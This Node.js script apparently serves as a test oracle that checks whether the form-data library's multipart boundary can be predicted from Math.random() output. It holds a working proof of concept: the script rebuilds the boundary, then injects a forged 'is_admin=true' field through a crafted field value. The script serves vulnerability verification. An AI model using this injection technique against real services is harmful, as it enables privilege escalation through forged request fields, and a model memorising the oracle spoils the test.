'use strict';
const FormData = require('form-data');
const os = require('node:os');
const path = require('node:path');
const fs = require('node:fs');

function result(obj) {
  console.log('ORACLE_RESULT ' + JSON.stringify(obj));
}

try {
  const marker = 'form_data_oracle_' + process.pid + '_' + Date.now();
  const tmpFile = path.join(os.tmpdir(), marker + '.txt');
  fs.writeFileSync(tmpFile, 'benign content ' + marker);

  // --- Benign operation: build a normal multipart form and verify the boundary
  // is present, well-formed, and the structure is sane.
  let benignForm;
  let benignBoundary;
  try {
    benignForm = new FormData();
    benignForm.append('field1', 'hello world');
    benignForm.append('file1', fs.createReadStream(tmpFile));
    benignBoundary = benignForm.getBoundary();
    if (!benignBoundary || typeof benignBoundary !== 'string' || benignBoundary.length < 10) {
      throw new Error('benign boundary malformed');
    }
    if (benignBoundary.indexOf('--------------------------') !== 0) {
      throw new Error('benign boundary missing expected prefix');
    }
  } catch (e) {
    result({ operation_completed: false, exploit_succeeded: false, evidence: 'benign operation failed: ' + String(e && e.message) });
    try { fs.unlinkSync(tmpFile); } catch (_) {}
    process.exit(0);
  }

  // Benign operation succeeded -> operation_completed may now become true.
  let operation_completed = true;

  // --- Malicious scenario: predict the boundary by observing several
  // Math.random() outputs (simulating what an attacker who can observe
  // sequential PRNG outputs from the target app could do), then forge a
  // multipart body containing that boundary followed by attacker-controlled
  // injected fields, and check whether the resulting serialized body from
  // form-data's own boundary generation collides with / matches our
  // prediction, allowing injection of an extra field beyond what the
  // application intended.
  //
  // We do this deterministically and safely (no network, no process spawn):
  // we seed-less sample a handful of Math.random() calls right before asking
  // form-data to generate a new boundary (form-data's boundary generation is
  // the very next call sequence in the vulnerable version, since it also
  // uses Math.random() for each of the 24 hex digits). In the vulnerable
  // version, the boundary is fully derived from Math.random() in a
  // predictable, observable sequence: if we replicate the exact same algorithm
  // using the *next* N outputs of Math.random() right after creating the
  // FormData instance, we should be able to reconstruct the exact boundary
  // string the library produced, because it's the deterministic function of
  // consecutive Math.random() calls with no cryptographic mixing. In the
  // patched version, the boundary is derived from crypto.randomBytes, which
  // is NOT reproducible from observing Math.random() outputs, so our
  // reconstruction will not match.

  function predictBoundaryFromMathRandom() {
    // Replicate form-data's vulnerable algorithm exactly.
    var boundary = '--------------------------';
    for (var i = 0; i < 24; i++) {
      boundary += Math.floor(Math.random() * 10).toString(16);
    }
    return boundary;
  }

  // To "observe" the PRNG stream the way an attacker would, we must consume
  // Math.random() calls in lockstep with form-data's internal boundary
  // generation. We achieve this by snapshotting Math.random, instrumenting it
  // to record every output it produces, then creating a new FormData
  // instance (which triggers boundary generation) and comparing the
  // recorded outputs/boundary against our own independent reconstruction
  // using the exact same recorded stream (simulating perfect prediction).

  var recorded = [];
  var originalRandom = Math.random;
  Math.random = function () {
    var v = originalRandom.call(Math);
    recorded.push(v);
    return v;
  };

  var attackForm;
  var actualBoundary;
  try {
    attackForm = new FormData();
    actualBoundary = attackForm.getBoundary();
  } finally {
    Math.random = originalRandom;
  }

  // Now, using the recorded Math.random() outputs consumed during boundary
  // generation (which is exactly what an attacker could observe/predict
  // given knowledge of the PRNG state), reconstruct what the boundary should
  // have been under the vulnerable algorithm.
  var reconstructed = '--------------------------';
  for (var i = 0; i < recorded.length && i < 24; i++) {
    reconstructed += Math.floor(recorded[i] * 10).toString(16);
  }

  var predictable = (recorded.length === 24) && (reconstructed === actualBoundary);

  if (predictable) {
    // Simulate the actual exploit: craft an attacker-controlled field value
    // that embeds the predicted boundary followed by an injected field
    // (e.g. is_admin=true), demonstrating request smuggling / parameter
    // injection would succeed if this boundary is used verbatim in a real
    // multipart body.
    var injectedPayload =
      'zzz\r\n' +
      actualBoundary +
      '\r\nContent-Disposition: form-data; name="is_admin"\r\n\r\ntrue\r\n' +
      actualBoundary + '--\r\n';

    var exploitForm = new FormData();
    exploitForm._boundary = actualBoundary; // force same boundary as predicted
    exploitForm.append('my_field', injectedPayload);

    var serialized = '';
    exploitForm.on('data', function (chunk) { serialized += chunk.toString('binary'); });
    exploitForm.on('end', function () {
      var injectionLanded = serialized.indexOf('name="is_admin"') !== -1 &&
        serialized.indexOf(actualBoundary) !== serialized.lastIndexOf(actualBoundary);
      try { fs.unlinkSync(tmpFile); } catch (_) {}
      result({
        operation_completed: operation_completed,
        exploit_succeeded: !!injectionLanded,
        evidence: injectionLanded
          ? 'Boundary fully reconstructed from observed Math.random() sequence and injected field landed in serialized multipart body (boundary=' + actualBoundary + ')'
          : 'Boundary was predictable but injected payload did not land as expected'
      });
    });
    exploitForm.resume();
  } else {
    try { fs.unlinkSync(tmpFile); } catch (_) {}
    result({
      operation_completed: operation_completed,
      exploit_succeeded: false,
      evidence: 'Boundary (' + String(actualBoundary) + ') could not be reconstructed from observed Math.random() outputs; not derived from predictable PRNG sequence as in the vulnerable implementation'
    });
  }
} catch (e) {
  result({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'Unexpected exception: ' + String(e && e.message ? e.message : e)
  });
}
